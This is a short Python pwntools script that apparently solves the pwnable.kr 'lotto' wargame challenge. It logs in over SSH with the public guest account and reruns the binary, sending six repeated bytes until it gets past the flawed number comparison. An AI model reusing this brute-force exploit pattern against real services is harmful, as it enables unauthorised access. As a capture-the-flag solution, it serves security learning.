from pwn import *

s = ssh(host = 'pwnable.kr', user = 'lotto', password='guest', port=2222)

while True:
    r = s.process('./lotto')
    r.recvuntil('Exit')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline('$'*6)
    r.recvline()
    info = r.recvline()
    if 'bad' not in info:
        print info
        raw_input()

    r.close()
